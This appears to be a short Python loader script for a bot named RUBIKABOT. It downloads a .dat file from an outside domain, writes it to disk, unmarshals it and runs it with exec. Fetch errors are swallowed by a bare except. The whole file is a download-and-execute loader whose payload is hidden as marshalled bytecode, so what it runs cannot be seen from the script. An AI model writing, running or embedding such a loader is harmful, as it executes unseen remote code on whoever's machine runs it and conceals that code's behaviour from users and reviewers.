import marshal
import requests
d="RUBIKABOT.dat"
u="l8pstudio.ir"+"/"+d
try:
    e=requests.get("https://"+u)
    with open("rb.dat","wb") as f:
        f.write(e.content)
    f.close()
except:pass
b=open("rb.dat",'rb')
a=marshal.load(b)
exec(marshal.loads(a))
